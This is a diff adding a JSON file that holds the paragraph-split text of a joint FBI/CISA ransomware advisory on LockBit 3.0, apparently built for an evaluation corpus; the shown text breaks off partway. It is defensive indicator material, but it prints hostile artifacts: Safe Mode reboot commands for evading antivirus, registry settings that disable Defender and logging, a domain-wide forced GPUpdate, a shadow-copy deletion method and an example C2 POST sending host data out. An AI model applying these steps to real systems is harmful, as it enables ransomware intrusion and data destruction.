@@ -1,0 +1,402 @@
+[
+ {
+  "id": "p1",
+  "text": "# #StopRansomware: LockBit 3.0"
+ },
+ {
+  "id": "p2",
+  "text": "> - Publisher: FBI Internet Crime Complaint Center (IC3), CSA listing — advisory id AA23-075A\n> - Date: 2023-03-16\n> - URL: https://www.ic3.gov/CSA/2023/230316.pdf\n> - PDF SHA-256: 5c211577bf64de8373cf264a3189918d46f0af870bedbcb18cf57b57102030fc (`source.pdf`, 19 pages)\n> - License: U.S. Government work (public domain)\n> - Text: `pdftotext -layout` output; only page furniture removed by `reports/eval/build_corpus.py` (74 lines). No other edits."
+ },
+ {
+  "id": "p3",
+  "text": "Coauthored by:                                                                                               Product ID: AA23-075A\n                                                                                                                   March 16, 2023"
+ },
+ {
+  "id": "p4",
+  "text": "#StopRansomware: LockBit 3.0\n       SUMMARY\n       Note: this joint Cybersecurity Advisory (CSA) is part of an\n                                                                               Actions to take today to mitigate\n       ongoing #StopRansomware effort to publish advisories for\n                                                                               cyber threats from ransomware:\n       network defenders that detail ransomware variants and\n                                                                               • Prioritize remediating known\n       ransomware threat actors. These #StopRansomware\n                                                                               exploited vulnerabilities.\n       advisories include recently and historically observed tactics,\n                                                                               • Train users to recognize and report\n       techniques, and procedures (TTPs) and indicators of\n                                                                               phishing attempts.\n       compromise (IOCs) to help organizations protect against\n                                                                               • Enable and enforce phishing-\n       ransomware. Visit stopransomware.gov to see all\n                                                                               resistant multifactor authentication.\n       #StopRansomware advisories and to learn more about other\n       ransomware threats and no-cost resources."
+ },
+ {
+  "id": "p5",
+  "text": "The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency\n       (CISA), and the Multi-State Information Sharing & Analysis Center (MS-ISAC) are releasing this joint\n       CSA to disseminate known LockBit 3.0 ransomware IOCs and TTPs identified through FBI\n       investigations as recently as March 2023."
+ },
+ {
+  "id": "p6",
+  "text": "The LockBit 3.0 ransomware operations function as a Ransomware-as-a-Service (RaaS) model and is\n       a continuation of previous versions of the ransomware, LockBit 2.0, and LockBit. Since January 2020,\n       LockBit has functioned as an affiliate-based ransomware variant; affiliates deploying the LockBit RaaS\n       use many varying TTPs and attack a wide range of businesses and critical infrastructure organizations,\n       which can make effective computer network defense and mitigation challenging."
+ },
+ {
+  "id": "p7",
+  "text": "The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the\n       mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents."
+ },
+ {
+  "id": "p8",
+  "text": "To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact\n       your local FBI field office at fbi.gov/contact-us/field-offices. When available, please include the following\n       information regarding the incident: date, time, and location of the incident; type of activity; number of people\n       affected; type of equipment used for the activity; the name of the submitting company or organization; and a\n       designated point of contact. To request incident response resources or technical assistance related to these\n       threats, contact CISA at Report@cisa.dhs.gov. State, local, territorial, and tribal (SLTT) organizations should\n       report incidents to MS-ISAC (866-787-4722 or SOC@cisecurity.org).\n       This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information\n       carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public\n       release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction.\n       For more information on the Traffic Light Protocol, see cisa.gov/tlp/."
+ },
+ {
+  "id": "p9",
+  "text": "TECHNICAL DETAILS\n       Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See the MITRE\n       ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE\n       ATT&CK for Enterprise.\n       CAPABILITIES\n       LockBit 3.0, also known as “LockBit Black,” is more modular and evasive than its previous versions\n       and shares similarities with Blackmatter and Blackcat ransomware.\n       LockBit 3.0 is configured upon compilation with many different options that determine the behavior of\n       the ransomware. Upon the actual execution of the ransomware within a victim environment, various\n       arguments can be supplied to further modify the behavior of the ransomware. For example, LockBit\n       3.0 accepts additional arguments for specific operations in lateral movement and rebooting into Safe\n       Mode (see LockBit Command Line parameters under Indicators of Compromise). If a LockBit affiliate\n       does not have access to passwordless LockBit 3.0 ransomware, then a password argument is\n       mandatory during the execution of the ransomware. LockBit 3.0 affiliates failing to enter the correct\n       password will be unable to execute the ransomware [T1480.001]. The password is a cryptographic\n       key which decodes the LockBit 3.0 executable. By protecting the code in such a manner, LockBit 3.0\n       hinders malware detection and analysis with the code being unexecutable and unreadable in its\n       encrypted form. Signature-based detections may fail to detect the LockBit 3.0 executable as the\n       executable’s encrypted potion will vary based on the cryptographic key used for encryption while also\n       generating a unique hash. When provided the correct password, LockBit 3.0 will decrypt the main\n       component, continue to decrypt or decompress its code, and execute the ransomware.\n       LockBit 3.0 will only infect machines that do not have language settings matching a defined exclusion\n       list. However, whether a system language is checked at runtime is determined by a configuration flag\n       originally set at compilation time. Languages on the exclusion list include, but are not limited to,\n       Romanian (Moldova), Arabic (Syria), and Tatar (Russia). If a language from the exclusion list is\n       detected [T1614.001], LockBit 3.0 will stop execution without infecting the system.\n       INITIAL ACCESS\n       Affiliates deploying LockBit 3.0 ransomware gain initial access to victim networks via remote desktop\n       protocol (RDP) exploitation [T1133], drive-by compromise [T1189], phishing campaigns [T1566],\n       abuse of valid accounts [T1078], and exploitation of public-facing applications [T1190].\n       EXECUTION AND INFECTION PROCESS\n       During the malware routine, if privileges are not sufficient, LockBit 3.0 attempts to escalate to the\n       required privileges [TA0004]. LockBit 3.0 performs functions such as:\n               Enumerating system information such as hostname, host configuration, domain information,\n                local drive configuration, remote shares, and mounted external storage devices [T1082]\n               Terminating processes and services [T1489]\n               Launching commands [TA0002]"
+ },
+ {
+  "id": "p10",
+  "text": "    Enabling automatic logon for persistence and privilege escalation [T1547]\n               Deleting log files, files in the recycle bin folder, and shadow copies residing on disk [T1485],\n                [T1490]\n       LockBit 3.0 attempts to spread across a victim network by using a preconfigured list of credentials\n       hardcoded at compilation time or a compromised local account with elevated privileges [T1078].\n       When compiled, LockBit 3.0 may also enable options for spreading via Group Policy Objects and\n       PsExec using the Server Message Block (SMB) protocol. LockBit 3.0 attempts to encrypt [T1486]\n       data saved to any local or remote device, but skips files associated with core system functions.\n       After files are encrypted, LockBit 3.0 drops a ransom note with the new filename <Ransomware\n       ID>.README.txt and changes the host’s wallpaper and icons to LockBit 3.0 branding [T1491.001]. If\n       needed, LockBit 3.0 will send encrypted host and bot information to a command and control (C2)\n       server [T1027].\n       Once completed, LockBit 3.0 may delete itself from the disk [T1070.004] as well as any Group Policy\n       updates that were made, depending on which options were set at compilation time.\n       EXFILTRATION\n       LockBit 3.0 affiliates use Stealbit, a custom exfiltration tool used previously with LockBit 2.0 [TA0010];\n       rclone, an open-source command line cloud storage manager [T1567.002]; and publicly available file\n       sharing services, such as MEGA [T1567.002], to exfiltrate sensitive company data files prior to\n       encryption. While rclone and many publicly available file sharing services are primarily used for\n       legitimate purposes, they can also be used by threat actors to aid in system compromise, network\n       exploration, or data exfiltration. LockBit 3.0 affiliates often use other publicly available file sharing\n       services to exfiltrate data as well [T1567] (see Table 1).\n                   Table 1: Anonymous File Sharing Sites Used to Exfiltrate Data Before System Encryption"
+ },
+ {
+  "id": "p11",
+  "text": "File Sharing Site\n                                              https://www.premiumize[.]com\n                                                  https://anonfiles[.]com\n                                               https://www.sendspace[.]com\n                                                      https://fex[.]net\n                                                    https://transfer[.]sh\n                                                  https://send.exploit[.]in"
+ },
+ {
+  "id": "p12",
+  "text": "LEVERAGING FREEWARE AND OPEN-SOURCE TOOLS\n       LockBit affiliates have been observed using various freeware and open-source tools during their\n       intrusions. These tools are used for a range of activities such as network reconnaissance, remote\n       access and tunneling, credential dumping, and file exfiltration. Use of PowerShell and Batch scripts"
+ },
+ {
+  "id": "p13",
+  "text": "are observed across most intrusions, which focus on system discovery, reconnaissance,\n       password/credential hunting, and privilege escalation. Artifacts of professional penetration-testing\n       tools such as Metasploit and Cobalt Strike have also been observed. See Table 2 for a list of\n       legitimate freeware and open-source tools LockBit affiliates have repurposed for ransomware\n       operations:\n                            Table 2: Freeware and Open-Source Tools Used by LockBit 3.0 Affiliates\n        Tool                           Description                                    MITRE ATT&CK ID\n        Chocolatey                     Command-line package manager for                     T1072\n                                       Windows.\n        FileZilla                      Cross-platform File Transfer Protocol (FTP)          T1071.002\n                                       application.\n        Impacket                       Collection of Python classes for working               S0357\n                                       with network protocols.\n        MEGA Ltd MegaSync              Cloud-based synchronization tool.                    T1567.002\n        Microsoft Sysinternals         Generates crash dumps. Commonly used                 T1003.001\n        ProcDump                       to dump the contents of Local Security\n                                       Authority Subsystem Service, LSASS.exe.\n        Microsoft Sysinternals         Execute a command-line process on a                    S0029\n        PsExec                         remote machine.\n        Mimikatz                       Extracts credentials from system.                      S0002\n        Ngrok                          Legitimate remote-access tool abused to                S0508\n                                       bypass victim network protections.\n        PuTTY Link (Plink)             Can be used to automate Secure Shell                   T1572\n                                       (SSH) actions on Windows.\n        Rclone                         Command-line program to manage cloud                   S1040\n                                       storage files.\n        SoftPerfect Network            Performs network scans.                                T1046\n        Scanner\n        Splashtop                      Remote-desktop software.                             T1021.001\n        WinSCP                         SSH File Transfer Protocol client for                  T1048\n                                       Windows."
+ },
+ {
+  "id": "p14",
+  "text": "Indicators of Compromise (IOCs)\n       The IOCs and malware characteristics outlined below were derived from field analysis. The following\n       samples are current as of March 2023."
+ },
+ {
+  "id": "p15",
+  "text": "LockBit 3.0 Black Icon"
+ },
+ {
+  "id": "p16",
+  "text": "LockBit 3.0 Wallpaper"
+ },
+ {
+  "id": "p17",
+  "text": "LockBit Command Line Parameters\n        LockBit Parameters                             Description\n        -del                                           Self-delete.\n        -gdel                                          Remove LockBit 3.0 group policy changes.\n        -gspd                                          Spread laterally via group policy.\n        -pass (32 character value)                     (Required) Password used to launch LockBit\n                                                       3.0.\n        -path (File or path)                           Only encrypts provided file or folder.\n        -psex                                          Spread laterally via admin shares.\n        -safe                                          Reboot host into Safe Mode.\n        -wall                                          Sets LockBit 3.0 Wallpaper and prints out\n                                                       LockBit 3.0 ransom note."
+ },
+ {
+  "id": "p18",
+  "text": "Mutual Exclusion Object (Mutex) Created\n       When executed, LockBit 3.0 will create the mutex, Global\\<MD4 hash of machine GUID>,\n        and check to see if this mutex has already been created to avoid running more than one instance of\n       the ransomware."
+ },
+ {
+  "id": "p19",
+  "text": "UAC Bypass via Elevated COM Interface\n       LockBit 3.0 is capable of bypassing User Account Control (UAC) to execute code with elevated\n       privileges via elevated Component Object Model (COM) Interface.\n       C:\\Windows\\System32\\dllhost.exe is spawned with high integrity with the command line GUID\n       3E5FC7F9-9A51-4367-9063-A120244FBEC.\n       For example, %SYSTEM32%\\dllhost.exe/Processid:{3E5FC7F9-9A51-4367-9063-\n       A120244FBEC7}."
+ },
+ {
+  "id": "p20",
+  "text": "Volume Shadow Copy Deletion\n       LockBit 3.0 uses Windows Management Instrumentation (WMI) to identify and delete Volume Shadow\n       Copies. LockBit 3.0 uses select * from Win32_ShadowCopy to query for Volume Shadow copies,\n       Win32_ShadowCopy.ID to obtain the ID of the shadow copy, and DeleteInstance to delete any\n       shadow copies."
+ },
+ {
+  "id": "p21",
+  "text": "Registry Artifacts\n       LockBit 3.0 Icon\n        Registry Key                             Value                Data\n        HKCR\\. <Malware Extension>               (Default)            <Malware Extension>\n        HKCR\\<Malware                            (Default)            C:\\ProgramData\\<Mal\n        Extension>\\DefaultIcon                                        ware Extension>.ico"
+ },
+ {
+  "id": "p22",
+  "text": "LockBit 3.0 Wallpaper\n        Registry Key                             Value                Data\n        HKCU\\Control                             (Default)            C:\\ProgramData\\<Mal\n        Panel\\Desktop\\WallPaper                                       ware Extension>.bmp"
+ },
+ {
+  "id": "p23",
+  "text": "Disable Privacy Settings Experience\n        Registry Key                             Value                Data\n        SOFTWARE\\Policies\\Microsoft\\Win          DisablePrivacyE      0\n        dows\\OOBE                                xperience"
+ },
+ {
+  "id": "p24",
+  "text": "Enable Automatic Logon\n        Registry Key                             Value                Data\n        SOFTWARE\\Microsoft\\Windows               AutoAdminLogon       1\n        NT\\CurrentVersion\\Winlogon\n                                                 DefaultUserName      <username>\n                                                 DefaultDomainNa      <domain name>\n                                                 me"
+ },
+ {
+  "id": "p25",
+  "text": "DefaultPassword        <password>"
+ },
+ {
+  "id": "p26",
+  "text": "Disable and Clear Windows Event Logs\n        Registry Key                                Value                 Data\n        HKLM\\SOFTWARE\\Microsoft\\Windows             Enabled               0\n        \\CurrentVersion\\WINEVT\\Channels\n        \\*\n        HKLM\\SOFTWARE\\Microsoft\\Windows             ChannelAccess         AO:BAG:SYD:(A;;0x1;;\n        \\CurrentVersion\\WINEVT\\Channels                                   ;SY)(A;;0x5;;;BA)(A;\n        \\* \\ChannelAccess                                                 ;0x1;;;LA)\n       Ransom Locations\n        LockBit 3.0 File Path Locations\n        ADMIN$\\Temp\\<LockBit3.0 Filename>.exe\n        %SystemRoot%\\Temp\\<LockBit3.0 Filename>.exe\n        \\<Domain Name>\\sysvol\\<Domain Name>\\scripts\\<Lockbit 3.0\n        Filename>.exe (Domain Controller)"
+ },
+ {
+  "id": "p27",
+  "text": "Safe Mode Launch Commands\n       LockBit 3.0 has a Safe Mode feature to circumvent endpoint antivirus and detection. Depending upon\n       the host operating system, the following command is launched to reboot the system to Safe Mode\n       with Networking:\n        Operating System                    Safe Mode with Networking command\n        Vista and newer                     bcdedit /set {current} safeboot network\n        Pre-Vista                           bootcfg /raw /a /safeboot:network /id 1"
+ },
+ {
+  "id": "p28",
+  "text": "Operating System                    Disable Safe mode reboot\n        Vista and newer                     bcdedit /deletevalue {current} safeboot\n        Pre-Vista                           bootcfg /raw /fastdetect /id 1"
+ },
+ {
+  "id": "p29",
+  "text": "Group Policy Artifacts\n       The following are Group Policy Extensible Markup Language (XML) files identified after a LockBit 3.0\n       infection:"
+ },
+ {
+  "id": "p30",
+  "text": "NetworkShares.xml\n        <?xml version=\"1.0\" encoding=\"utf-8\"?>\n        <NetworkShareSettings clsid=\"{520870D8-A6E7-47e8-A8D8-E6A4E76EAEC2}\">\n            <NetShare clsid=\"{2888C5E7-94FC-4739-90AA-2C1536D68BC0}\"\n        image=\"2\" name=\"%%ComputerName%%_D\" changed=\"%s\" uid=\"%s\">\n                <Properties action=\"U\" name=\"%%ComputerName%%_D\" path=\"D:\"\n        comment=\"\" allRegular=\"0\" allHidden=\"0\" allAdminDrive=\"0\"\n        limitUsers=\"NO_CHANGE\" abe=\"NO_CHANGE\"/>"
+ },
+ {
+  "id": "p31",
+  "text": "Services.xml stops and disables services on the Active Directory (AD) hosts.\n        Services.xml\n        <?xml version=\"1.0\" encoding=\"utf-8\"?>\n        <NTServices clsid=\"{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}\">\n             <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"SQLPBDMS\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\">\n                  <Properties startupType=\"DISABLED\" serviceName=\"SQLPBDMS\"\n        serviceAction=\"STOP\" timeout=\"30\"/>\n             </NTService>\n             <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"SQLPBENGINE\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\">\n                  <Properties startupType=\"DISABLED\" serviceName=\"SQLPBENGINE\"\n        serviceAction=\"STOP\" timeout=\"30\"/>\n             </NTService>\n             <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"MSSQLFDLauncher\" image=\"4\" changed=\"%s\" uid=\"%s\"\n        userContext=\"0\" removePolicy=\"0\" disabled=\"0\">\n                  <Properties startupType=\"DISABLED\"\n        serviceName=\"MSSQLFDLauncher\" serviceAction=\"STOP\" timeout=\"30\"/>\n             </NTService>\n             <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"SQLSERVERAGENT\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\">\n                  <Properties startupType=\"DISABLED\"\n        serviceName=\"SQLSERVERAGENT\" serviceAction=\"STOP\" timeout=\"30\"/>\n             </NTService>\n             <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"MSSQLServerOLAPService\" image=\"4\" changed=\"%s\" uid=\"%s\"\n        disabled=\"0\">\n                  <Properties startupType=\"DISABLED\"\n        serviceName=\"MSSQLServerOLAPService\" serviceAction=\"STOP\"\n        timeout=\"30\"/>\n             </NTService>\n             <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"SSASTELEMETRY\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\">\n                  <Properties startupType=\"DISABLED\"\n        serviceName=\"SSASTELEMETRY\" serviceAction=\"STOP\" timeout=\"30\"/>\n             </NTService>\n             <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"SQLBrowser\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\">\n                  <Properties startupType=\"DISABLED\" serviceName=\"SQLBrowser\"\n        serviceAction=\"STOP\" timeout=\"30\"/>\n             </NTService>\n             <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"SQL Server Distributed Replay Client\" image=\"4\" changed=\"%s\"\n        uid=\"%s\" disabled=\"0\">\n                  <Properties startupType=\"DISABLED\" serviceName=\"SQL Server\n        Distributed Replay Client\" serviceAction=\"STOP\" timeout=\"30\"/>\n             </NTService>"
+ },
+ {
+  "id": "p32",
+  "text": "<NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"SQL Server Distributed Replay Controller\" image=\"4\"\n        changed=\"%s\" uid=\"%s\" disabled=\"0\">\n                <Properties startupType=\"DISABLED\" serviceName=\"SQL Server\n        Distributed Replay Controller\" serviceAction=\"STOP\" timeout=\"30\"/>\n            </NTService>\n            <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"MsDtsServer150\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\">\n                <Properties startupType=\"DISABLED\"\n        serviceName=\"MsDtsServer150\" serviceAction=\"STOP\" timeout=\"30\"/>\n            </NTService>\n            <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"SSISTELEMETRY150\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\">\n                <Properties startupType=\"DISABLED\"\n        serviceName=\"SSISTELEMETRY150\" serviceAction=\"STOP\" timeout=\"30\"/>\n            </NTService>\n            <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"SSISScaleOutMaster150\" image=\"4\" changed=\"%s\" uid=\"%s\"\n        disabled=\"0\">\n                <Properties startupType=\"DISABLED\"\n        serviceName=\"SSISScaleOutMaster150\" serviceAction=\"STOP\"\n        timeout=\"30\"/>\n            </NTService>\n            <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"SSISScaleOutWorker150\" image=\"4\" changed=\"%s\" uid=\"%s\"\n        disabled=\"0\">\n                <Properties startupType=\"DISABLED\"\n        serviceName=\"SSISScaleOutWorker150\" serviceAction=\"STOP\"\n        timeout=\"30\"/>\n            </NTService>\n            <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"MSSQLLaunchpad\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\">\n                <Properties startupType=\"DISABLED\"\n        serviceName=\"MSSQLLaunchpad\" serviceAction=\"STOP\" timeout=\"30\"/>\n            </NTService>\n            <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"SQLWriter\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\">\n                <Properties startupType=\"DISABLED\" serviceName=\"SQLWriter\"\n        serviceAction=\"STOP\" timeout=\"30\"/>\n            </NTService>\n            <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"SQLTELEMETRY\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\">\n                <Properties startupType=\"DISABLED\" serviceName=\"SQLTELEMETRY\"\n        serviceAction=\"STOP\" timeout=\"30\"/>\n            </NTService>\n            <NTService clsid=\"{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}\"\n        name=\"MSSQLSERVER\" image=\"4\" changed=\"%s\" uid=\"%s\" disabled=\"0\">\n                <Properties startupType=\"DISABLED\" serviceName=\"MSSQLSERVER\"\n        serviceAction=\"STOP\" timeout=\"60\"/>"
+ },
+ {
+  "id": "p33",
+  "text": "</NTService>\n        </NTServices>"
+ },
+ {
+  "id": "p34",
+  "text": "Registry.pol\n       The following registry configuration changes values for the Group Policy refresh time, disable\n       SmartScreen, and disable Windows Defender.\n        Registry Key                                             Registry Value              Value      Data\n                                                                                             type\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  GroupPolicyRefresh REG_D               1\n        s\\System                                                 TimeDC                      WORD\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  GroupPolicyRefresh REG_D               1\n        s\\System                                                 TimeOffsetDC                WORD\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  GroupPolicyRefresh REG_D               1\n        s\\System                                                 Time                        WORD\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  GroupPolicyRefresh REG_D               1\n        s\\System                                                 TimeOffset                  WORD\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  EnableSmartScreen           REG_D      0\n        s\\System                                                                             WORD\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  **del.ShellSmartSc REG_S\n        s\\System                                                 reenLevel                   Z\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  DisableAntiSpyware REG_D               1\n        s Defender                                                                           WORD\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  DisableRoutinelyTa REG_D               1\n        s Defender                                               kingAction                  WORD\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  DisableRealtimeMon REG_D               1\n        s Defender\\Real-Time Protection                          itoring                     WORD\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  DisableBehaviorMon REG_D               1\n        s Defender\\Real-Time Protection                          itoring                     WORD\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  SubmitSamplesConse REG_D               2\n        s Defender\\Spynet                                        nt                          WORD\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  SpynetReporting             REG_D      0\n        s Defender\\Spynet                                                                    WORD\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  EnableFirewall              REG_D      0\n        sFirewall\\DomainProfile                                                              WORD\n        HKLM\\SOFTWARE\\Policies\\Microsoft\\Window                  EnableFirewall              REG_D      0\n        sFirewall\\StandardProfile                                                            WORD"
+ },
+ {
+  "id": "p35",
+  "text": "Force GPUpdate\n       Once new group policies are added, a PowerShell command using Group Policy update (GPUpdate)\n       applies the new group policy changes to all computers on the AD domain.\n        Force GPUpdate Powershell Command\n        powershell Get-ADComputer -filter * -Searchbase '%s' | Foreach-Object { Invoke-\n        GPUpdate -computer $_.name -force -RandomDelayInMinutes 0}"
+ },
+ {
+  "id": "p36",
+  "text": "Services Killed\n                       vss                           sql                              svc$\n                      memtas                       mepocs                          msexchange\n                      sophos                        veeam                            backup\n                      GxVss                         GxBlr                            GxFWD\n                      GxCVD                        GxCIMgr\n       Processes Killed\n        sql                             oracle                          ocssd\n        dbsnmp                          synctime                        agntsvc\n        isqlplussvc                     xfssvccon                       mydesktopservice\n        ocautoupds                      encsvc                          firefox\n        tbirdconfig                     mydesktopqos                    ocomm\n        dbeng50                         sqbcoreservice                  excel\n        infopath                        msaccess                        mspu\n        onenote                         outlook                         powerpnt\n        steam                           thebat                          thunderbird\n        visio                           winword                         wordpad\n        notepad"
+ },
+ {
+  "id": "p37",
+  "text": "LockBit 3.0 Ransom Note\n        ~~~ LockBit 3.0 the world's fastest and most stable ransomware from 2019~~~\n        >>>>> Your data is stolen and encrypted.\n        If you don't pay the ransom, the data will be published on our TOR darknet sites. Keep in mind that\n        once your data appears on our leak site, it could be bought by your competitors at any second, so\n        don't hesitate for a long time. The sooner you pay the ransom, the sooner your company will be\n        safe."
+ },
+ {
+  "id": "p38",
+  "text": "Network Connections\n       If configured, Lockbit 3.0 will send two HTTP POST requests to one of the C2servers. Information\n       about the victim host and bot are encrypted with an Advanced Encryption Standard (AES) key and\n       encoded in Base64.\n       Example of HTTP POST request\n       POST <Lockbit\n       C2>/?7F6Da=u5a0TdP0&Aojq=&NtN1W=OuoaovMvrVJSmPNaA5&fckp9=FCYyT6b7kdyeEXywS8I8\n       HTTP/1.1\n       Accept: */*\n       Accept-Encoding: gzip, deflate, br\n       Content-Type: text/plain"
+ },
+ {
+  "id": "p39",
+  "text": "User-Agent: Safari/537.36 <Lockbit User Agent String>\n       Host: <Lockbit C2>\n       Connection: Keep-Alive\n       LIWy=RJ51lB5GM&a4OuN=<Lockbit\n       ID>&LoSyE3=8SZ1hdlhzld4&DHnd99T=rTx9xGlInO6X0zWW&2D6=Bokz&T1guL=MtRZsFCRMKyBmfmqI&\n       6SF3g=JPDt9lfJIQ&wQadZP=<Base64 encrypted data>\n       Xni=AboZOXwUw&2rQnM4=94L&0b=ZfKv7c&NO1d=M2kJlyus&AgbDTb=xwSpba&8sr=EndL4n0HVZjxPR&\n       m4ZhTTH=sBVnPY&xZDiygN=cU1pAwKEztU&=5q55aFIAfTVQWTEm&4sXwVWcyhy=l68FrIdBESIvfCkvYl\n       Example of information found in encrypted data\n       {\n                \"bot_version\":\"X\",\n                \"bot_id\":\"X\",\n                \"bot_company\":\"X\",\n                \"host_hostname\":\"X\",\n                \"host_user\":\"X\",\n                \"host_os\":\"X\",\n                \"host_domain\":\"X\",\n                \"host_arch\":\"X\",\n                \"host_lang\":\"X\",\n                \"disks_info\":[\n                                  {\n                                  \"disk_name\":\"X\",\n                                  \"disk_size\":\"XXXX\",\n                                  \"free_size\":\"XXXXX\"\n       }"
+ },
+ {
+  "id": "p40",
+  "text": "User Agent Strings\n       Mozilla/5.0 (Windows NT                 AppleWebKit/587.38    Chrome/91.0.4472.77\n       6.1)                                    (KHTML, like Gecko)\n       Safari/537.36                           Edge/91.0.864.37      Firefox/89.0\n       Gecko/20100101"
+ },
+ {
+  "id": "p41",
+  "text": "MITRE ATT&CK TECHNIQUES\n       See Table 2 for all referenced threat actor tactics and techniques in this advisory. For assistance with\n       mapping to the MITRE ATT&CK framework, see CISA’s Decider Tool and Best Practices for MITRE\n       ATT&CK Mapping Guide.\n                                 Table 3: LockBit 3.0 Actors ATT&CK Techniques for Enterprise"
+ },
+ {
+  "id": "p42",
+  "text": "Initial Access"
+ },
+ {
+  "id": "p43",
+  "text": "Technique Title                       ID                               Use"
+ },
+ {
+  "id": "p44",
+  "text": "Valid Accounts                                T1078          LockBit 3.0 actors obtain and abuse\n                                                                     credentials of existing accounts as a\n                                                                     means of gaining initial access."
+ },
+ {
+  "id": "p45",
+  "text": "Exploit External Remote                       T1133          LockBit 3.0 actors exploit RDP to gain\n        Services                                                     access to victim networks."
+ },
+ {
+  "id": "p46",
+  "text": "Drive-by Compromise                           T1189          LockBit 3.0 actors gain access to a system\n                                                                     through a user visiting a website over the\n                                                                     normal course of browsing."
+ },
+ {
+  "id": "p47",
+  "text": "Exploit Public-Facing Application             T1190          LockBit 3.0 actors exploit vulnerabilities in\n                                                                     internet-facing systems to gain access to\n                                                                     victims’ systems."
+ },
+ {
+  "id": "p48",
+  "text": "Phishing                                      T1566          LockBit 3.0 actors use phishing and\n                                                                     spearphishing to gain access to victims'\n                                                                     networks."
+ },
+ {
+  "id": "p49",
+  "text": "Execution"
+ },
+ {
+  "id": "p50",
+  "text": "Technique Title                                 ID           Use"
+ },
+ {
+  "id": "p51",
+  "text": "Execution                                    TA0002          LockBit 3.0 launches commands during its\n                                                                     execution."
+ },
+ {
+  "id": "p52",
+  "text": "Software Deployment Tools                     T1072          LockBit 3.0 uses Chocolatey, a command-\n                                                                     line package manager for Windows."
+ },
+ {
+  "id": "p53",
+  "text": "Persistence"
+ },
+ {
+  "id": "p54",
+  "text": "Technique Title                        ID            Use"
+ },
+ {
+  "id": "p55",
+  "text": "Valid Accounts                       T1078           LockBit 3.0 uses a compromised user\n                                                             account to maintain persistence on the\n                                                             target network."
+ },
+ {
+  "id": "p56",
+  "text": "Boot or Logo Autostart Execution     T1547           LockBit 3.0 enables automatic logon for\n                                                             persistence."
+ },
+ {
+  "id": "p57",
+  "text": "Privilege Escalation"
+ },
+ {
+  "id": "p58",
+  "text": "Technique Title                        ID            Use"
+ },
+ {
+  "id": "p59",
+  "text": "Privilege Escalation                TA0004           Lockbit 3.0 will attempt to escalate to the\n                                                             required privileges if current account\n                                                             privileges are insufficient."
+ },
+ {
+  "id": "p60",
+  "text": "Boot or Logo Autostart Execution     T1547           LockBit 3.0 enables automatic logon for\n                                                             privilege escalation."
+ },
+ {
+  "id": "p61",
+  "text": "Defense Evasion"
+ },
+ {
+  "id": "p62",
+  "text": "Technique Title                        ID            Use"
+ },
+ {
+  "id": "p63",
+  "text": "Obfuscated Files or Information      T1027           LockBit 3.0 will send encrypted host and\n                                                             bot information to its C2 servers."
+ },
+ {
+  "id": "p64",
+  "text": "Indicator Removal: File Deletion   T1070.004         LockBit 3.0 will delete itself from the disk."
+ },
+ {
+  "id": "p65",
